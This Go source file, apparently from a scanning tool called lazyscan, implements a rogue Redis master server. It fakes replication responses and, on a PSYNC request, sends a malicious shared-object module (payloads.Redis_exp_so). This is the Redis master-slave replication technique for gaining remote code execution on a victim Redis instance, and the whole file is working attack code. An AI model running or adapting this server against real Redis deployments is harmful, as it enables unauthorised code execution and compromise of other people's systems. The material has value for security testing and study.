package runner

import (
	"log"
	"strings"

	"github.com/404tk/lazyscan/common/payloads"
	"github.com/tidwall/redcon"
)

func (opt *Options) RunRedisRogueServer() {
	if opt.RedisRogueServer == "" {
		return
	}
	log.Println("启动Redis Rogue Server:", opt.RedisRogueServer)
	err := redcon.ListenAndServe(opt.RedisRogueServer,
		func(conn redcon.Conn, cmd redcon.Command) {
			switch strings.ToLower(string(cmd.Args[0])) {
			default:
				conn.WriteError("ERR unknown command '" + string(cmd.Args[0]) + "'")
			case "ping":
				conn.WriteString("PONG")
			case "auth":
				conn.WriteString("OK")
			case "quit":
				conn.WriteString("OK")
				_ = conn.Close()
			case "replconf":
				conn.WriteString("OK")
			case "psync":
				if len(cmd.Args) != 3 {
					conn.WriteError("ERR wrong number of arguments for '" + string(cmd.Args[0]) + "' command")
					return
				}
				conn.WriteString("FULLRESYNC aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 1")
				conn.WriteBulk(payloads.Redis_exp_so)
			}
		},
		func(conn redcon.Conn) bool {
			return true
		},
		func(conn redcon.Conn, err error) {
		},
	)
	if err != nil {
		log.Println(err.Error())
	}
}
